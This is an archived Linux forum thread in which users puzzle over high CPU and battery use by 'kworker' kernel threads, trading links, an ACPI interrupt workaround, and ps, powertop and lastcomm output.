---
title: "What is kworker?"
date: 2010-11-25
forum: General Help
---

### Post by klausner on 2010-11-25
I've started seeing something called "kworker" listed recently when I run *top*. There is no man page for it, and there seems to be no documentation at all. Searching Google didn't help.

Even odder, it regularly makes the top ten resources consumer in *top*, but it doesn't seem to be using any resources:

>    26 root      20   0     0    0    0 R    0  0.0   7:08.58 kworker/1:1 

What's it for, what does it do, and is there any documentation? :confused:

---

### Post by klausner on 2010-11-30
Bump.

---

### Post by ronnielsen1 on 2010-11-30
I was really hoping someone would answer this thread because I spent quite a while looking. You're right. There's not a lot of info out there. I see people affected with an Intel video card or a mouse, so it would seem like it has something to do with interrupts but I'm not sure. I even went to Bing and wikipedia as a last resort. It didn't help. Here's what I found in case you didn't. It's not much help.

> K[URL="http://koppermind.homelinux.org/kworker.html"]Worker is in process ...
		At the moment there is not active source code to download because the project is in very early version. 		The only active place on this page is the bug tracking page that keeps my current list of bugs-tracks open. 		When the project hits the 0.1 release (see bug tracking) it will be available to the public (and maybe to some volunteers)[/URL]. 		

&

[http://koppermind.homelinux.org/kworkerbugs.php?selection=a](http://koppermind.homelinux.org/kworkerbugs.php?selection=a)

[http://forums.gentoo.org/viewtopic-t-846896.html?sid=2f2896b30ae2776062851dade0c06da0](http://forums.gentoo.org/viewtopic-t-846896.html?sid=2f2896b30ae2776062851dade0c06da0)

[https://bugzilla.kernel.org/show_bug.cgi?id=20232](https://bugzilla.kernel.org/show_bug.cgi?id=20232)

[http://aptosid.com/index.php?name=PNphpBB2&file=viewtopic&t=330&sid=01eb9397dcf84eb9803f16dc397b6db9](http://aptosid.com/index.php?name=PNphpBB2&file=viewtopic&t=330&sid=01eb9397dcf84eb9803f16dc397b6db9)

---

### Post by klausner on 2010-12-03
Bump

---

### Post by jmmL on 2010-12-07
I'm having trouble with this as well. Running natty, so using 2.6.27-8 x86_64.

It seems alleviated by running```
echo disable > /sys/firmware/acpi/interrupts/gpe01
```
[Source.]("http://www.mail-archive.com/acpi-bugzilla@lists.sourceforge.net/msg31739.html")

---

### Post by klausner on 2010-12-21
Bump.

---

### Post by llawwehttam on 2010-12-26
Kworker is what controls the ACPI wakeup signals from the BIOS.

The latest kernel, well all of them since 2.6.35 have had issues with too many wakeups.

This is an issue across ALL linux distributions.

Hopefully it's going to be fixed in kernel 2.6.35.

The current snapshot is: **2.6.37-rc7-git3** so it shouldn't be too long.

---

### Post by klausner on 2010-12-26
> **llawwehttam said:**
> Kworker is what controls the ACPI wakeup signals from the BIOS.

The latest kernel, well all of them since 2.6.35 have had issues with too many wakeups.

This is an issue across ALL linux distributions.

Hopefully it's going to be fixed in kernel 2.6.35.

The current snapshot is: **2.6.37-rc7-git3** so it shouldn't be too long.

Thank you for the description. Do you know where this is documentation on this, and other mystery tasks like the "migration" process?

---

### Post by WorMzy on 2010-12-26
I'm using Arch with kernel 2.6.36-ARCH, and I have seven kworker processes.

Is this better or worse than your situation?

---

### Post by klausner on 2010-12-26
> **WorMzy said:**
> I'm using Arch with kernel 2.6.36-ARCH, and I have seven kworker processes.

Is this better or worse than your situation?

I have eight right now. Not sure what that signifies.

---

### Post by WorMzy on 2010-12-26
Me either, to be honest.

However, when I last checked only one one of mine seems to be "working", all the rest were "sleeping". Now, all of them are sleeping.

Unless all of yours appear to be "working" constantly, I suspect that there isn't a problem.

---

### Post by klausner on 2010-12-26
> **WorMzy said:**
> Unless all of yours appear to be "working" constantly, I suspect that there isn't a problem.

It's not currently a problem, though I have had them become CPU hogs in the past.

I'm really trying to get to the bottom of the documentation issue. I want to be able to find references to Linux's parts, so I know what I am doing with it. I can find most things, but mystery commands bug me.

---

### Post by efflandt on 2010-12-26
It actually seems to be worse in a newer Natty kernel.  With an earlier in Natty I seemed to have one kworker averaging about 80% of one idle cpu (all cpus 1200 MHz for 3.2 GHz cpu).  But currently there are several that max out one cpu and then some:

```
**uname -a**
Linux natty-ssd 2.6.37-11-generic #25-Ubuntu SMP Tue Dec 21 23:42:56 UTC 2010 x86_64 GNU/Linux

**ps aux | grep kworker**
root        12  0.0  0.0      0     0 ?        S    Dec25   0:00 [kworker/2:0]
root        33  0.0  0.0      0     0 ?        S    Dec25   0:07 [kworker/2:1]
root       662  0.0  0.0      0     0 ?        S    Dec25   0:00 [kworker/3:2]
root      2543  0.0  0.0      0     0 ?        S    05:27   0:05 [kworker/1:2]
root      3631  0.0  0.0      0     0 ?        S    08:40   0:33 [kworker/3:0]
root      3766  0.0  0.0      0     0 ?        S    11:20   0:08 [kworker/1:0]
root      4237 19.3  0.0      0     0 ?        S    19:58  29:26 [kworker/0:2]
root      4329  0.2  0.0      0     0 ?        S    20:26   0:15 [kworker/u:0]
root      4333 52.1  0.0      0     0 ?        S    20:35  60:17 [kworker/0:0]
root      4386 76.9  0.0      0     0 ?        R    21:49  31:50 [kworker/0:1]
root      4406  0.4  0.0      0     0 ?        S    22:18   0:03 [kworker/u:1]
root      4638  0.0  0.0      0     0 ?        S    22:28   0:00 [kworker/u:2]

**grep MHz /proc/cpuinfo**
cpu MHz        : 3201.000
cpu MHz        : 1200.000
cpu MHz        : 1200.000
cpu MHz        : 1200.000
```I'll have to check out what they do in Maverick with default current kernel.

---

### Post by Cerebrux on 2011-01-19
> **efflandt said:**
> It actually seems to be worse in a newer Natty kernel.  With an earlier in Natty I seemed to have one kworker averaging about 80% of one idle cpu (all cpus 1200 MHz for 3.2 GHz cpu).  But currently there are several that max out one cpu and then some:

That is true ! I am using natty with the latest updates till now and kworker is somthing that eats :popcorn: a LOT of battery !!! I checked it with "powertop" (available in Software Center) to check what processes consume AC power 
```
**sudo powertop**
Cn                Avg residency       P-states (frequencies)
C0 (cpu running)        ( 4.4%)       Turbo Mode     1.5%
polling           0.1ms ( 0.0%)         1466 Mhz     0.4%
C1 mwait          0.2ms ( 0.2%)         1333 Mhz     0.1%
C2 mwait          1.8ms (26.4%)         1199 Mhz     0.0%
C3 mwait          1.9ms (69.0%)          933 Mhz    98.1%

Wakeups-from-idle per second : 517.5    interval: 15.0s
no ACPI power usage estimate available

Top causes for wakeups:
  56.0% (419.9)   PS/2 keyboard/mouse/touchpad interrupt
  22.0% (164.9)   kworker/0:1
  11.0% ( 82.4)   [extra timer interrupt]
   8.9% ( 66.5)D  firefox-bin
   

```

Update
Hey ! Even Linus Torvalds has this problem [http://lkml.org/lkml/2010/8/15/111](http://lkml.org/lkml/2010/8/15/111)

---

### Post by Zuba on 2011-04-02
Well, i have 2.6.38 now, and no Intel card (i have NVidia), and kworker is still doing that...

---

### Post by mdshw5 on 2011-04-12
> **Zuba said:**
> Well, i have 2.6.38 now, and no Intel card (i have NVidia), and kworker is still doing that...

This sums up my experience now.  I have a Thinkpad T61 with Natty, and since apt-get upgrade this morning I have kworkers spawning all over the place, interrupting both mouse and keyboard interrupts! There has been a bug report, but it needs more feedback: [https://bugs.launchpad.net/ubuntu/+source/xserver-xorg-video-intel/+bug/746084](https://bugs.launchpad.net/ubuntu/+source/xserver-xorg-video-intel/+bug/746084)

---

### Post by GTMoraes on 2011-04-13
Enabling USB Suspension seems like to make Kworker go crazy, not only killing my USB ports, but also eating every single available CPU Resource (and as a dessert, the battery).

Not enabling USB Suspension seems to be the solution, but that's might be increasing my idle battery consumption from 6.5 to 8w (or it's the natty by itself). I dislike this =(
[LEFT]__________________________
[/LEFT]

[CENTER]**Media Center PC**: AMD Athlon 64 X2 5000 | 2GB DDR2 800 | ATi Radeon HD3200 | 320GB HDD SATA II | Realtek ALC889A | Sony Bravia 46" 120Hz | Ubuntu Maverick
**Netbook**: Acer Aspire 1410-2287 ~ Intel Celeron ULV 723 1.2GHz | 2GB DDR2 800 | 250GB HDD | Intel 4500mHD | 11,3" HD LED | 6:30hrs Battery | Ubuntu Natty
[IMG]http://i53.tinypic.com/2d6se9l.png[/IMG]
[SIZE="1"]**Ubuntu Powered.**[/SIZE][/CENTER]

---

### Post by goscuter1 on 2011-04-18
I found this thread looking for info about kworker. Should it be using the terminal? (I realise that might be a retarded question...)

But my kworkers own your kworkers' faces. Mine are from the future! I think. I don't really know, how the timing ordering works or really what I'm doing. I'm just copying commands I see posted. 

```
~$ sudo lastcomm
kworker/7:3       F    root     __         0.00 secs Tue Apr 19 04:27
kworker/3:1       F    root     __         0.00 secs Tue Apr 19 04:27
kworker/7:0       F    root     __         0.00 secs Tue Apr 19 03:14
kworker/3:0       F    root     __         0.00 secs Tue Apr 19 04:27
kworker/0:0       F    root     __         0.00 secs Tue Apr 19 04:22
kworker/4:0       F    root     __         0.00 secs Tue Apr 19 04:19
kworker/0:3       F    root     __         0.01 secs Tue Apr 19 04:17
grep                   goscuter pts/2      0.00 secs Tue Apr 19 04:25
ps                     goscuter pts/2      0.01 secs Tue Apr 19 04:25
grep                   goscuter pts/2      0.00 secs Tue Apr 19 04:25
sudo             S     root     pts/2      0.00 secs Tue Apr 19 04:25
ps               S     root     pts/2      0.03 secs Tue Apr 19 04:25
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/4:3       F    root     __         0.00 secs Tue Apr 19 04:14
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
sh                     root     pts/2      0.00 secs Tue Apr 19 04:24
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:24
modprobe               root     __         0.00 secs Tue Apr 19 04:24
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
sh                     root     pts/2      0.00 secs Tue Apr 19 04:23
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
sh                     root     pts/2      0.00 secs Tue Apr 19 04:23
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
sh                     root     pts/2      0.00 secs Tue Apr 19 04:23
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:23
modprobe               root     __         0.00 secs Tue Apr 19 04:23
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
sh                     root     pts/2      0.00 secs Tue Apr 19 04:22
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
sh                     root     pts/2      0.00 secs Tue Apr 19 04:22
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/0:0       F    root     __         0.00 secs Tue Apr 19 04:12
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
sh                     root     pts/2      0.00 secs Tue Apr 19 04:22
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
sh                     root     pts/2      0.00 secs Tue Apr 19 04:22
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:22
modprobe               root     __         0.00 secs Tue Apr 19 04:22
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
sh                     root     pts/2      0.00 secs Tue Apr 19 04:21
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
sh                     root     pts/2      0.00 secs Tue Apr 19 04:21
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
sh                     root     pts/2      0.00 secs Tue Apr 19 04:21
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:21
modprobe               root     __         0.00 secs Tue Apr 19 04:21
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
sh                     root     pts/2      0.00 secs Tue Apr 19 04:20
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
sh                     root     pts/2      0.00 secs Tue Apr 19 04:20
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
sh                     root     pts/2      0.00 secs Tue Apr 19 04:20
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
sh                     root     pts/2      0.00 secs Tue Apr 19 04:20
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:20
modprobe               root     __         0.00 secs Tue Apr 19 04:20
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
sh                     root     pts/2      0.00 secs Tue Apr 19 04:19
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
sh                     root     pts/2      0.00 secs Tue Apr 19 04:19
iwpriv           S     root     pts/2      0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
kworker/4:0       F    root     __         0.00 secs Tue Apr 19 04:09
kworker/u:4       F    root     __         0.00 secs Tue Apr 19 04:19
modprobe               root     __         0.00 secs Tue Apr 19 04:19
